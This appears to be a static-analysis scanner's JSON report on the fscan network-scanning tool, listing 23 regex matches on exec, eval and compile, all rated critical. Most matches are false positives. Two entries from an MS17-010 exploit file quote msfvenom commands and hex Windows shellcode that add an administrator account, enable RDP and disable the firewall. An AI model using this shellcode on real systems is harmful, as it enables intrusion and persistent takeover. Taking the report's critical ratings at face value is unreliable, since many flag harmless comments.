var datas = {"problems": [{"language": "go", "match_type": "regex", "match_rule": "exec", "description": "执行系统命令", "file_path": "./gotest/fscan-main\\common\\flag.go", "severity": "critical", "context": "    42   \tflag.StringVar(&UserAdd, \"usera\", \"\", \"add a user base DefaultUsers,-usera user\")\n    43   \tflag.StringVar(&PassAdd, \"pwda\", \"\", \"add a password base DefaultPasses,-pwda password\")\n    44   \tflag.StringVar(&NoPorts, \"pn\", \"\", \"the ports no scan,as: -pn 445\")\n--> 45   \tflag.StringVar(&Command, \"c\", \"\", \"exec command (ssh)\")\n    46   \tflag.StringVar(&SshKey, \"sshkey\", \"\", \"sshkey file (id_rsa)\")\n    47   \tflag.StringVar(&Domain, \"domain\", \"\", \"smb domain\")\n    48   \tflag.StringVar(&Username, \"user\", \"\", \"username\")\n    49   \tflag.StringVar(&Password, \"pwd\", \"\", \"password\")", "ptype": "待定", "confidence": "NAN"}, {"language": "go", "match_type": "regex", "match_rule": "exec", "description": "执行系统命令", "file_path": "./gotest/fscan-main\\common\\Parse.go", "severity": "critical", "context": "    5   \t\"flag\"\n    6   \t\"fmt\"\n    7   \t\"os\"\n--> 8   \t\"os/exec\"\n    9   \t\"path/filepath\"\n    10   \t\"strconv\"\n    11   \t\"strings\"\n    12   )", "ptype": "待定", "confidence": "NAN"}, {"language": "go", "match_type": "regex", "match_rule": "exec", "description": "执行系统命令", "file_path": "./gotest/fscan-main\\common\\Parse.go", "severity": "critical", "context": "    221   }\n    222   \n    223   func getpath() string {\n--> 224   \tfile, _ := exec.LookPath(os.Args[0])\n    225   \tpath1, _ := filepath.Abs(file)\n    226   \tfilename := filepath.Dir(path1)\n    227   \tvar path string\n    228   \tif strings.Contains(filename, \"/\") {", "ptype": "待定", "confidence": "NAN"}, {"language": "go", "match_type": "regex", "match_rule": "(os|exec)\\.(Command)(Context)?", "description": "Command injection may occur", "file_path": "./gotest/fscan-main\\Plugins\\icmp.go", "severity": "critical", "context": "    208   func ExecCommandPing(ip string, bsenv string) bool {\n    209   \tvar command *exec.Cmd\n    210   \tif OS == \"windows\" {\n--> 211   \t\tcommand = exec.Command(\"cmd\", \"/c\", \"ping -n 1 -w 1 \"+ip+\" && echo true || echo false\") //ping -c 1 -i 0.5 -t 4 -W 2 -w 5 \"+ip+\" >/dev/null && echo true || echo false\"\n    212   \t} else if OS == \"linux\" {\n    213   \t\tcommand = exec.Command(bsenv, \"-c\", \"ping -c 1 -w 1 \"+ip+\" >/dev/null && echo true || echo false\") //ping -c 1 -i 0.5 -t 4 -W 2 -w 5 \"+ip+\" >/dev/null && echo true || echo false\"\n    214   \t} else if OS == \"darwin\" {\n    215   \t\tcommand = exec.Command(bsenv, \"-c\", \"ping -c 1 -W 1 \"+ip+\" >/dev/null && echo true || echo false\") //ping -c 1 -i 0.5 -t 4 -W 2 -w 5 \"+ip+\" >/dev/null && echo true || echo false\"", "ptype": "待定", "confidence": "NAN"}, {"language": "go", "match_type": "regex", "match_rule": "(os|exec)\\.(Command)(Context)?", "description": "Command injection may occur", "file_path": "./gotest/fscan-main\\Plugins\\icmp.go", "severity": "critical", "context": "    210   \tif OS == \"windows\" {\n    211   \t\tcommand = exec.Command(\"cmd\", \"/c\", \"ping -n 1 -w 1 \"+ip+\" && echo true || echo false\") //ping -c 1 -i 0.5 -t 4 -W 2 -w 5 \"+ip+\" >/dev/null && echo true || echo false\"\n    212   \t} else if OS == \"linux\" {\n--> 213   \t\tcommand = exec.Command(bsenv, \"-c\", \"ping -c 1 -w 1 \"+ip+\" >/dev/null && echo true || echo false\") //ping -c 1 -i 0.5 -t 4 -W 2 -w 5 \"+ip+\" >/dev/null && echo true || echo false\"\n    214   \t} else if OS == \"darwin\" {\n    215   \t\tcommand = exec.Command(bsenv, \"-c\", \"ping -c 1 -W 1 \"+ip+\" >/dev/null && echo true || echo false\") //ping -c 1 -i 0.5 -t 4 -W 2 -w 5 \"+ip+\" >/dev/null && echo true || echo false\"\n    216   \t}\n    217   \toutinfo := bytes.Buffer{}", "ptype": "待定", "confidence": "NAN"}, {"language": "go", "match_type": "regex", "match_rule": "(os|exec)\\.(Command)(Context)?", "description": "Command injection may occur", "file_path": "./gotest/fscan-main\\Plugins\\icmp.go", "severity": "critical", "context": "    212   \t} else if OS == \"linux\" {\n    213   \t\tcommand = exec.Command(bsenv, \"-c\", \"ping -c 1 -w 1 \"+ip+\" >/dev/null && echo true || echo false\") //ping -c 1 -i 0.5 -t 4 -W 2 -w 5 \"+ip+\" >/dev/null && echo true || echo false\"\n    214   \t} else if OS == \"darwin\" {\n--> 215   \t\tcommand = exec.Command(bsenv, \"-c\", \"ping -c 1 -W 1 \"+ip+\" >/dev/null && echo true || echo false\") //ping -c 1 -i 0.5 -t 4 -W 2 -w 5 \"+ip+\" >/dev/null && echo true || echo false\"\n    216   \t}\n    217   \toutinfo := bytes.Buffer{}\n    218   \tcommand.Stdout = &outinfo\n    219   \terr := command.Start()", "ptype": "待定", "confidence": "NAN"}, {"language": "go", "match_type": "regex", "match_rule": "exec", "description": "执行系统命令", "file_path": "./gotest/fscan-main\\Plugins\\icmp.go", "severity": "critical", "context": "    6   \t\"github.com/shadow1ng/fscan/common\"\n    7   \t\"golang.org/x/net/icmp\"\n    8   \t\"net\"\n--> 9   \t\"os/exec\"\n    10   \t\"runtime\"\n    11   \t\"strings\"\n    12   \t\"sync\"\n    13   \t\"time\"", "ptype": "待定", "confidence": "NAN"}, {"language": "go", "match_type": "regex", "match_rule": "exec", "description": "执行系统命令", "file_path": "./gotest/fscan-main\\Plugins\\icmp.go", "severity": "critical", "context": "    206   }\n    207   \n    208   func ExecCommandPing(ip string, bsenv string) bool {\n--> 209   \tvar command *exec.Cmd\n    210   \tif OS == \"windows\" {\n    211   \t\tcommand = exec.Command(\"cmd\", \"/c\", \"ping -n 1 -w 1 \"+ip+\" && echo true || echo false\") //ping -c 1 -i 0.5 -t 4 -W 2 -w 5 \"+ip+\" >/dev/null && echo true || echo false\"\n    212   \t} else if OS == \"linux\" {\n    213   \t\tcommand = exec.Command(bsenv, \"-c\", \"ping -c 1 -w 1 \"+ip+\" >/dev/null && echo true || echo false\") //ping -c 1 -i 0.5 -t 4 -W 2 -w 5 \"+ip+\" >/dev/null && echo true || echo false\"", "ptype": "待定", "confidence": "NAN"}, {"language": "go", "match_type": "regex", "match_rule": "exec", "description": "执行系统命令", "file_path": "./gotest/fscan-main\\Plugins\\icmp.go", "severity": "critical", "context": "    208   func ExecCommandPing(ip string, bsenv string) bool {\n    209   \tvar command *exec.Cmd\n    210   \tif OS == \"windows\" {\n--> 211   \t\tcommand = exec.Command(\"cmd\", \"/c\", \"ping -n 1 -w 1 \"+ip+\" && echo true || echo false\") //ping -c 1 -i 0.5 -t 4 -W 2 -w 5 \"+ip+\" >/dev/null && echo true || echo false\"\n    212   \t} else if OS == \"linux\" {\n    213   \t\tcommand = exec.Command(bsenv, \"-c\", \"ping -c 1 -w 1 \"+ip+\" >/dev/null && echo true || echo false\") //ping -c 1 -i 0.5 -t 4 -W 2 -w 5 \"+ip+\" >/dev/null && echo true || echo false\"\n    214   \t} else if OS == \"darwin\" {\n    215   \t\tcommand = exec.Command(bsenv, \"-c\", \"ping -c 1 -W 1 \"+ip+\" >/dev/null && echo true || echo false\") //ping -c 1 -i 0.5 -t 4 -W 2 -w 5 \"+ip+\" >/dev/null && echo true || echo false\"", "ptype": "待定", "confidence": "NAN"}, {"language": "go", "match_type": "regex", "match_rule": "exec", "description": "执行系统命令", "file_path": "./gotest/fscan-main\\Plugins\\icmp.go", "severity": "critical", "context": "    210   \tif OS == \"windows\" {\n    211   \t\tcommand = exec.Command(\"cmd\", \"/c\", \"ping -n 1 -w 1 \"+ip+\" && echo true || echo false\") //ping -c 1 -i 0.5 -t 4 -W 2 -w 5 \"+ip+\" >/dev/null && echo true || echo false\"\n    212   \t} else if OS == \"linux\" {\n--> 213   \t\tcommand = exec.Command(bsenv, \"-c\", \"ping -c 1 -w 1 \"+ip+\" >/dev/null && echo true || echo false\") //ping -c 1 -i 0.5 -t 4 -W 2 -w 5 \"+ip+\" >/dev/null && echo true || echo false\"\n    214   \t} else if OS == \"darwin\" {\n    215   \t\tcommand = exec.Command(bsenv, \"-c\", \"ping -c 1 -W 1 \"+ip+\" >/dev/null && echo true || echo false\") //ping -c 1 -i 0.5 -t 4 -W 2 -w 5 \"+ip+\" >/dev/null && echo true || echo false\"\n    216   \t}\n    217   \toutinfo := bytes.Buffer{}", "ptype": "待定", "confidence": "NAN"}, {"language": "go", "match_type": "regex", "match_rule": "exec", "description": "执行系统命令", "file_path": "./gotest/fscan-main\\Plugins\\icmp.go", "severity": "critical", "context": "    212   \t} else if OS == \"linux\" {\n    213   \t\tcommand = exec.Command(bsenv, \"-c\", \"ping -c 1 -w 1 \"+ip+\" >/dev/null && echo true || echo false\") //ping -c 1 -i 0.5 -t 4 -W 2 -w 5 \"+ip+\" >/dev/null && echo true || echo false\"\n    214   \t} else if OS == \"darwin\" {\n--> 215   \t\tcommand = exec.Command(bsenv, \"-c\", \"ping -c 1 -W 1 \"+ip+\" >/dev/null && echo true || echo false\") //ping -c 1 -i 0.5 -t 4 -W 2 -w 5 \"+ip+\" >/dev/null && echo true || echo false\"\n    216   \t}\n    217   \toutinfo := bytes.Buffer{}\n    218   \tcommand.Stdout = &outinfo\n    219   \terr := command.Start()", "ptype": "待定", "confidence": "NAN"}, {"language": "go", "match_type": "regex", "match_rule": "exec", "description": "执行系统命令", "file_path": "./gotest/fscan-main\\Plugins\\ms17010-exp.go", "severity": "critical", "context": "    24   \t\t//cs gen C shellcode -> fmt.Printf(\"%x\", c) -> hex\n    25   \t\tsc = \"\"\n    26   \tcase \"add\":\n--> 27   \t\t//msfvenom -p windows/x64/exec EXITFUNC=thread CMD='cmd.exe /c net user sysadmin \"1qaz@WSX!@#4\" /ADD && net localgroup Administrators sysadmin /ADD && REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f && netsh advfirewall set allprofiles state off' -f hex\n    28   \t\tsc = \"fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5636d642e657865202f63206e657420757365722073797361646d696e20223171617a405753582140233422202f414444202626206e6574206c6f63616c67726f75702041646d696e6973747261746f72732073797361646d696e202f414444202626205245472041444420484b4c4d5c53595354454d5c43757272656e74436f6e74726f6c5365745c436f6e74726f6c5c5465726d696e616c222022536572766572202f76206644656e795453436f6e6e656374696f6e73202f74205245475f44574f5244202f64203030303030303030202f66202626206e65747368206164766669726577616c6c2073657420616c6c70726f66696c6573207374617465206f666600\"\n    29   \tcase \"guest\":\n    30   \t\t//msfvenom -p windows/x64/exec EXITFUNC=thread CMD='cmd.exe /c net user Guest /active:yes && net user Guest \"1qaz@WSX!@#4\" && net localgroup Administrators Guest /ADD && REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f && netsh advfirewall set allprofiles state off' -f hex\n    31   \t\tsc = \"fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5636d642e657865202f63206e65742075736572204775657374202f6163746976653a796573202626206e6574207573657220477565737420223171617a405753582140233422202626206e6574206c6f63616c67726f75702041646d696e6973747261746f7273204775657374202f414444202626205245472041444420484b4c4d5c53595354454d5c43757272656e74436f6e74726f6c5365745c436f6e74726f6c5c5465726d696e616c222022536572766572202f76206644656e795453436f6e6e656374696f6e73202f74205245475f44574f5244202f64203030303030303030202f66202626206e65747368206164766669726577616c6c2073657420616c6c70726f66696c6573207374617465206f666600\"", "ptype": "待定", "confidence": "NAN"}, {"language": "go", "match_type": "regex", "match_rule": "exec", "description": "执行系统命令", "file_path": "./gotest/fscan-main\\Plugins\\ms17010-exp.go", "severity": "critical", "context": "    27   \t\t//msfvenom -p windows/x64/exec EXITFUNC=thread CMD='cmd.exe /c net user sysadmin \"1qaz@WSX!@#4\" /ADD && net localgroup Administrators sysadmin /ADD && REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f && netsh advfirewall set allprofiles state off' -f hex\n    28   \t\tsc = \"fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5636d642e657865202f63206e657420757365722073797361646d696e20223171617a405753582140233422202f414444202626206e6574206c6f63616c67726f75702041646d696e6973747261746f72732073797361646d696e202f414444202626205245472041444420484b4c4d5c53595354454d5c43757272656e74436f6e74726f6c5365745c436f6e74726f6c5c5465726d696e616c222022536572766572202f76206644656e795453436f6e6e656374696f6e73202f74205245475f44574f5244202f64203030303030303030202f66202626206e65747368206164766669726577616c6c2073657420616c6c70726f66696c6573207374617465206f666600\"\n    29   \tcase \"guest\":\n--> 30   \t\t//msfvenom -p windows/x64/exec EXITFUNC=thread CMD='cmd.exe /c net user Guest /active:yes && net user Guest \"1qaz@WSX!@#4\" && net localgroup Administrators Guest /ADD && REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f && netsh advfirewall set allprofiles state off' -f hex\n    31   \t\tsc = \"fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5636d642e657865202f63206e65742075736572204775657374202f6163746976653a796573202626206e6574207573657220477565737420223171617a405753582140233422202626206e6574206c6f63616c67726f75702041646d696e6973747261746f7273204775657374202f414444202626205245472041444420484b4c4d5c53595354454d5c43757272656e74436f6e74726f6c5365745c436f6e74726f6c5c5465726d696e616c222022536572766572202f76206644656e795453436f6e6e656374696f6e73202f74205245475f44574f5244202f64203030303030303030202f66202626206e65747368206164766669726577616c6c2073657420616c6c70726f66696c6573207374617465206f666600\"\n    32   \tdefault:\n    33   \t\tif strings.Contains(common.SC, \"file:\") {\n    34   \t\t\tread, err := ioutil.ReadFile(common.SC[5:])", "ptype": "待定", "confidence": "NAN"}, {"language": "go", "match_type": "regex", "match_rule": "eval", "description": "执行系统命令", "file_path": "./gotest/fscan-main\\WebScan\\lib\\check.go", "severity": "critical", "context": "    88   \t\t\tvariableMap[k] = newReverse()\n    89   \t\t\tcontinue\n    90   \t\t}\n--> 91   \t\terr, _ = evalset(env, variableMap, k, expression)\n    92   \t\tif err != nil {\n    93   \t\t\tfmt.Printf(\"[-] %s evalset error: %v\", p.Name, err)\n    94   \t\t}\n    95   \t}", "ptype": "待定", "confidence": "NAN"}, {"language": "go", "match_type": "regex", "match_rule": "eval", "description": "执行系统命令", "file_path": "./gotest/fscan-main\\WebScan\\lib\\check.go", "severity": "critical", "context": "    90   \t\t}\n    91   \t\terr, _ = evalset(env, variableMap, k, expression)\n    92   \t\tif err != nil {\n--> 93   \t\t\tfmt.Printf(\"[-] %s evalset error: %v\", p.Name, err)\n    94   \t\t}\n    95   \t}\n    96   \tsuccess := false\n    97   \t//爆破模式,比如tomcat弱口令", "ptype": "待定", "confidence": "NAN"}, {"language": "go", "match_type": "regex", "match_rule": "eval", "description": "执行系统命令", "file_path": "./gotest/fscan-main\\WebScan\\lib\\check.go", "severity": "critical", "context": "    278   \t\t\t\tif key == \"payload\" {\n    279   \t\t\t\t\ttmpexpression = expression\n    280   \t\t\t\t}\n--> 281   \t\t\t\t_, output := evalset1(env, variableMap, key, expression)\n    282   \t\t\t\tpayloads[key] = output\n    283   \t\t\t}\n    284   \t\t\tfor _, one := range p.Sets {\n    285   \t\t\t\tflag := false", "ptype": "待定", "confidence": "NAN"}, {"language": "go", "match_type": "regex", "match_rule": "eval", "description": "执行系统命令", "file_path": "./gotest/fscan-main\\WebScan\\lib\\check.go", "severity": "critical", "context": "    482   \treturn cloneTags\n    483   }\n    484   \n--> 485   func evalset(env *cel.Env, variableMap map[string]interface{}, k string, expression string) (err error, output string) {\n    486   \tout, err := Evaluate(env, expression, variableMap)\n    487   \tif err != nil {\n    488   \t\tvariableMap[k] = expression\n    489   \t} else {", "ptype": "待定", "confidence": "NAN"}, {"language": "go", "match_type": "regex", "match_rule": "eval", "description": "执行系统命令", "file_path": "./gotest/fscan-main\\WebScan\\lib\\check.go", "severity": "critical", "context": "    499   \treturn err, fmt.Sprintf(\"%v\", variableMap[k])\n    500   }\n    501   \n--> 502   func evalset1(env *cel.Env, variableMap map[string]interface{}, k string, expression string) (err error, output string) {\n    503   \tout, err := Evaluate(env, expression, variableMap)\n    504   \tif err != nil {\n    505   \t\tvariableMap[k] = expression\n    506   \t} else {", "ptype": "待定", "confidence": "NAN"}, {"language": "go", "match_type": "regex", "match_rule": "exec", "description": "执行系统命令", "file_path": "./gotest/fscan-main\\WebScan\\lib\\check.go", "severity": "critical", "context": "    31   \tfor i := 0; i < workers; i++ {\n    32   \t\tgo func() {\n    33   \t\t\tfor task := range tasks {\n--> 34   \t\t\t\tisVul, _, name := executePoc(task.Req, task.Poc)\n    35   \t\t\t\tif isVul {\n    36   \t\t\t\t\tresult := fmt.Sprintf(\"[+] %s %s %s\", task.Req.URL, task.Poc.Name, name)\n    37   \t\t\t\t\tcommon.LogSuccess(result)\n    38   \t\t\t\t}", "ptype": "待定", "confidence": "NAN"}, {"language": "go", "match_type": "regex", "match_rule": "exec", "description": "执行系统命令", "file_path": "./gotest/fscan-main\\WebScan\\lib\\check.go", "severity": "critical", "context": "    52   \tclose(tasks)\n    53   }\n    54   \n--> 55   func executePoc(oReq *http.Request, p *Poc) (bool, error, string) {\n    56   \tc := NewEnvOption()\n    57   \tc.UpdateCompileOptions(p.Set)\n    58   \tif len(p.Sets) > 0 {\n    59   \t\tvar setMap StrMap", "ptype": "待定", "confidence": "NAN"}, {"language": "go", "match_type": "regex", "match_rule": "compile", "description": "执行系统命令", "file_path": "./gotest/fscan-main\\WebScan\\lib\\eval.go", "severity": "critical", "context": "    32   func Evaluate(env *cel.Env, expression string, params map[string]interface{}) (ref.Val, error) {\n    33   \tast, iss := env.Compile(expression)\n    34   \tif iss.Err() != nil {\n--> 35   \t\t//fmt.Printf(\"compile: \", iss.Err())\n    36   \t\treturn nil, iss.Err()\n    37   \t}\n    38   \n    39   \tprg, err := env.Program(ast)", "ptype": "待定", "confidence": "NAN"}, {"language": "go", "match_type": "regex", "match_rule": "compile", "description": "执行系统命令", "file_path": "./gotest/fscan-main\\WebScan\\lib\\http.pb.go", "severity": "critical", "context": "    124   var _ = fmt.Errorf\n    125   var _ = math.Inf\n    126   \n--> 127   // This is a compile-time assertion to ensure that this generated file\n    128   // is compatible with the proto package it is being compiled against.\n    129   // A compilation error at this line likely means your copy of the\n    130   // proto package needs to be updated.\n    131   const _ = proto.ProtoPackageIsVersion3 // please upgrade the proto package", "ptype": "待定", "confidence": "NAN"}, {"language": "go", "match_type": "regex", "match_rule": "compile", "description": "执行系统命令", "file_path": "./gotest/fscan-main\\WebScan\\lib\\http.pb.go", "severity": "critical", "context": "    125   var _ = math.Inf\n    126   \n    127   // This is a compile-time assertion to ensure that this generated file\n--> 128   // is compatible with the proto package it is being compiled against.\n    129   // A compilation error at this line likely means your copy of the\n    130   // proto package needs to be updated.\n    131   const _ = proto.ProtoPackageIsVersion3 // please upgrade the proto package\n    132   ", "ptype": "待定", "confidence": "NAN"}], "basic": {"totleNum": 23, "criticalLevel": 23, "highLevel": 0, "mediumLevel": 0, "lowLevel": 0, "prompt": 0}}